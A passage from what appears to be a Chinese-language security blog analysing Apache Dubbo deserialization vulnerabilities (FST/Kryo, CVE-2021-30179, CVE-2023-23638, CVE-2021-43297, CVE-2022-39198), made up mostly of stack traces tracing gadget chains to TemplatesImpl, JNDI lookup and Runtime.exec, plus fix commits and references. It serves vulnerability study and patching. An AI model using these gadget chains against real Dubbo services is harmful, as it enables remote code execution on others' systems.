class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span>.codec)decode:<span class="hljs-number">48</span>, DubboCountCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">90</span>, NettyCodecAdapter<span class="hljs-variable">$InternalDecoder</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.netty4)decodeRemovalReentryProtection:<span class="hljs-number">489</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)callDecode:<span class="hljs-number">428</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)channelRead:<span class="hljs-number">265</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)invokeChannelRead:<span class="hljs-number">362</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">348</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)fireChannelRead:<span class="hljs-number">340</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)channelRead:<span class="hljs-number">1434</span>, DefaultChannelPipeline<span class="hljs-variable">$HeadContext</span> (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">362</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">348</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)fireChannelRead:<span class="hljs-number">965</span>, DefaultChannelPipeline (io<span class="hljs-selector-class">.netty</span>.channel)read:<span class="hljs-number">163</span>, AbstractNioByteChannel<span class="hljs-variable">$NioByteUnsafe</span> (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKey:<span class="hljs-number">647</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKeysOptimized:<span class="hljs-number">582</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKeys:<span class="hljs-number">499</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)run:<span class="hljs-number">461</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)run:<span class="hljs-number">884</span>, SingleThreadEventExecutor$<span class="hljs-number">5</span> (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">30</span>, FastThreadLocalRunnable (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h3 id="FST反序列化"><a href="#FST反序列化" class="headerlink" title="FST反序列化"></a>FST反序列化</h3><p>和Kryo反序列化一样，首先根据<code>this.serializationType</code>获取序列化器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215173308100.png"> </p><p>获取到KryoSerialization序列化器后调用deserialize()创建一个FstObjectInput对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215173449774.png">  </p><p>接着继续获取客户端传来的版本，服务名，方法名，方法描述符等信息，在创建对象数组和类数组，在从输入流中根据类数组类型恢复对象数组</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215173524640.png"></p><p>进入in.readObject()方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215173759990.png"> </p><p>再来到org.nustaq.serialization.FSTObjectInput#readObject(java.lang.Class…)方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215173812564.png"></p><p>接下来的处理过程全为fst依赖包处理的，后续的利用链还是HashMap.put()–&gt;HashMap.putVal()–&gt;org.springframework.aop.target.HotSwappableTargetSource#equals -&gt; com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)-&gt;JSONObject.toString()</p><p><strong>调用链</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)write:-<span class="hljs-number">1</span>, ASMSerializer_1_TemplatesImpl (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">270</span>, MapSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">44</span>, MapSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">280</span>, JSONSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)toJSONString:<span class="hljs-number">863</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)toString:<span class="hljs-number">857</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)equals:<span class="hljs-number">392</span>, XString (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects)equals:<span class="hljs-number">104</span>, HotSwappableTargetSource (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.target)putVal:<span class="hljs-number">634</span>, HashMap (java.util)put:<span class="hljs-number">611</span>, HashMap (java.util)instantiate:<span class="hljs-number">79</span>, FSTMapSerializer (org<span class="hljs-selector-class">.nustaq</span><span class="hljs-selector-class">.serialization</span>.serializers)instantiateAndReadWithSer:<span class="hljs-number">497</span>, FSTObjectInput (org<span class="hljs-selector-class">.nustaq</span>.serialization)readObjectWithHeader:<span class="hljs-number">366</span>, FSTObjectInput (org<span class="hljs-selector-class">.nustaq</span>.serialization)readObjectInternal:<span class="hljs-number">327</span>, FSTObjectInput (org<span class="hljs-selector-class">.nustaq</span>.serialization)readObject:<span class="hljs-number">307</span>, FSTObjectInput (org<span class="hljs-selector-class">.nustaq</span>.serialization)readObject:<span class="hljs-number">102</span>, FstObjectInput (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.serialize</span>.fst)decode:<span class="hljs-number">116</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">73</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decodeBody:<span class="hljs-number">132</span>, DubboCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">122</span>, ExchangeCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span>.codec)decode:<span class="hljs-number">82</span>, ExchangeCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span>.codec)decode:<span class="hljs-number">48</span>, DubboCountCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">90</span>, NettyCodecAdapter<span class="hljs-variable">$InternalDecoder</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.netty4)decodeRemovalReentryProtection:<span class="hljs-number">489</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)callDecode:<span class="hljs-number">428</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)channelRead:<span class="hljs-number">265</span>, ByteToMessageDecoder (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.handler</span>.codec)invokeChannelRead:<span class="hljs-number">362</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">348</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)fireChannelRead:<span class="hljs-number">340</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)channelRead:<span class="hljs-number">1434</span>, DefaultChannelPipeline<span class="hljs-variable">$HeadContext</span> (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">362</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)invokeChannelRead:<span class="hljs-number">348</span>, AbstractChannelHandlerContext (io<span class="hljs-selector-class">.netty</span>.channel)fireChannelRead:<span class="hljs-number">965</span>, DefaultChannelPipeline (io<span class="hljs-selector-class">.netty</span>.channel)read:<span class="hljs-number">163</span>, AbstractNioByteChannel<span class="hljs-variable">$NioByteUnsafe</span> (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKey:<span class="hljs-number">647</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKeysOptimized:<span class="hljs-number">582</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)processSelectedKeys:<span class="hljs-number">499</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)run:<span class="hljs-number">461</span>, NioEventLoop (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.channel</span>.nio)run:<span class="hljs-number">884</span>, SingleThreadEventExecutor$<span class="hljs-number">5</span> (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">30</span>, FastThreadLocalRunnable (io<span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>由于漏洞出在Fst和Kryo组件中，dubbo的缓解方案为将该两个组件从其本身中移除，需要自行导入</p><h1 id="CVE-2021-30179"><a href="#CVE-2021-30179" class="headerlink" title="CVE-2021-30179"></a>CVE-2021-30179</h1><h2 id="漏洞通告-3"><a href="#漏洞通告-3" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp</a></p><p>该漏洞出现在泛型调用上，攻击者可控制第三个参数attachment</p><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h3><h4 id="raw-return"><a href="#raw-return" class="headerlink" title="raw.return"></a>raw.return</h4><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)toObjectImpl:<span class="hljs-number">35</span>, JndiConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)toObject:<span class="hljs-number">86</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)setAsText:<span class="hljs-number">59</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)realize0:<span class="hljs-number">483</span>, PojoUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.utils)realize:<span class="hljs-number">211</span>, PojoUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.utils)realize:<span class="hljs-number">99</span>, PojoUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.utils)invoke:<span class="hljs-number">91</span>, GenericFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)invoke:<span class="hljs-number">41</span>, EchoFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span><span class="hljs-selector-class">.support</span>.header)received:<span class="hljs-number">51</span>, DecodeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span>.transport)run:<span class="hljs-number">57</span>, ChannelEventRunnable (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.dispatcher)runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-variable">$Worker</span> (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h4 id="bean"><a href="#bean" class="headerlink" title="bean"></a>bean</h4><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)toObjectImpl:<span class="hljs-number">35</span>, JndiConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)toObject:<span class="hljs-number">86</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)setAsText:<span class="hljs-number">59</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)deserializeInternal:<span class="hljs-number">282</span>, JavaBeanSerializeUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.beanutil)deserialize:<span class="hljs-number">215</span>, JavaBeanSerializeUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.beanutil)deserialize:<span class="hljs-number">204</span>, JavaBeanSerializeUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span>.beanutil)invoke:<span class="hljs-number">115</span>, GenericFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)invoke:<span class="hljs-number">41</span>, EchoFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.<span class="hljs-attribute">filter</span>)invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.protocol)reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span><span class="hljs-selector-class">.support</span>.header)received:<span class="hljs-number">51</span>, DecodeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span>.transport)run:<span class="hljs-number">57</span>, ChannelEventRunnable (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.dispatcher)runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-variable">$Worker</span> (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/dubbo/pull/7436/commits/c8f67e1cd34b0ea5f7d1468bb2a28a3ebb8f9fb1">https://github.com/apache/dubbo/pull/7436/commits/c8f67e1cd34b0ea5f7d1468bb2a28a3ebb8f9fb1</a></p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/apache/dubbo/releases/tag/dubbo-2.7.10">https://github.com/apache/dubbo/releases/tag/dubbo-2.7.10</a></p><h1 id="CVE-2023-23638"><a href="#CVE-2023-23638" class="headerlink" title="CVE-2023-23638"></a>CVE-2023-23638</h1><h2 id="漏洞通告-4"><a href="#漏洞通告-4" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb">https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb</a></p><p>该漏洞问题还是出在泛型调用上</p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/dubbo/commit/4f664f0a3d338673f4b554230345b89c580bccbb">https://github.com/apache/dubbo/commit/4f664f0a3d338673f4b554230345b89c580bccbb</a></p><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/12396">https://xz.aliyun.com/t/12396</a></p><p><a href="https://xz.aliyun.com/t/12333">https://xz.aliyun.com/t/12333</a></p><h1 id="CVE-2021-43297"><a href="#CVE-2021-43297" class="headerlink" title="CVE-2021-43297"></a>CVE-2021-43297</h1><h2 id="漏洞通告-5"><a href="#漏洞通告-5" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww">https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww</a></p><p>问题出在hessian-lite组件中，漏洞点是toString方法</p><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getObjectFactoryFromReference:<span class="hljs-number">163</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)getObjectInstance:<span class="hljs-number">319</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)resolve:<span class="hljs-number">73</span>, ContextUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)getObject:<span class="hljs-number">204</span>, ContextUtil<span class="hljs-variable">$ReadOnlyBinding</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)toString:<span class="hljs-number">192</span>, Binding (javax.naming)valueOf:<span class="hljs-number">2994</span>, String (java.lang)append:<span class="hljs-number">131</span>, StringBuilder (java.lang)expect:<span class="hljs-number">3566</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readString:<span class="hljs-number">1883</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObjectDefinition:<span class="hljs-number">2824</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObject:<span class="hljs-number">2745</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObject:<span class="hljs-number">2308</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)</code></pre></div><h2 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/ca45bf8f8f41c6e5f7fb96c8cc6b409384de9a18">https://github.com/apache/dubbo-hessian-lite/commit/ca45bf8f8f41c6e5f7fb96c8cc6b409384de9a18</a></p><p>官方把抛出异常处的对象转字符串输出去掉，即不会调用对象的toString方法</p><h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a href="https://harmless.blue/posts/bafdbae3-29de-4788-800d-ed9d5d8d0d79">https://harmless.blue/posts/bafdbae3-29de-4788-800d-ed9d5d8d0d79</a></p><h1 id="CVE-2022-39198"><a href="#CVE-2022-39198" class="headerlink" title="CVE-2022-39198"></a>CVE-2022-39198</h1><h2 id="漏洞通告-6"><a href="#漏洞通告-6" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/8d3zqrkoy4jh8dy37j4rd7g9jodzlvkk">https://lists.apache.org/thread/8d3zqrkoy4jh8dy37j4rd7g9jodzlvkk</a></p><p>漏洞出在hessian-lite组件中，漏洞入口还是toString</p><h2 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.dubbo</span>.DecodeableRpcInvocation<span class="hljs-selector-id">#decode</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.dubbo</span>.DubboProtocol<span class="hljs-selector-id">#getInvoker</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.RpcInvocation<span class="hljs-selector-id">#toString</span>com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.JSON<span class="hljs-selector-id">#toString</span>sun<span class="hljs-selector-class">.print</span>.UnixPrintServiceLookup<span class="hljs-selector-id">#getDefaultPrintService</span>...Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>()</code></pre></div><h2 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/dubbo-hessian-lite/compare/v3.2.12...v3.2.13">https://github.com/apache/dubbo-hessian-lite/compare/v3.2.12...v3.2.13</a></p><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad">https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad</a></p><h2 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247494921&idx=1&sn=bbc62ee0b2ab4c044879faa184ede17a&chksm=c1d9ad50f6ae2446b6a33ae6206ea714f6c796432f5810c4a61bbc8cd5f668a25c1cbaae4f89&mpshare=1&scene=23&srcid=1229F1tzsZ8K98Pyca31NlKE&sharer_sharetime=1672307140694&sharer_shareid=24839d642488f66c87d327e0cf5b7e60#rd">https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&amp;mid=2247494921&amp;idx=1&amp;sn=bbc62ee0b2ab4c044879faa184ede17a&amp;chksm=c1d9ad50f6ae2446b6a33ae6206ea714f6c796432f5810c4a61bbc8cd5f668a25c1cbaae4f89&amp;mpshare=1&amp;scene=23&amp;srcid=1229F1tzsZ8K98Pyca31NlKE&amp;sharer_sharetime=1672307140694&amp;sharer_shareid=24839d642488f66c87d327e0cf5b7e60#rd</a></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><a href="https://xz.aliyun.com/t/8917">https://xz.aliyun.com/t/8917</a></p><p>对比两个tag版本之间提交的commit记录</p><p><a href="https://github.com/apache/dubbo/compare">https://github.com/apache/dubbo/compare</a></p><h2 id="全版本"><a href="#全版本" class="headerlink" title="全版本"></a>全版本</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/">https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
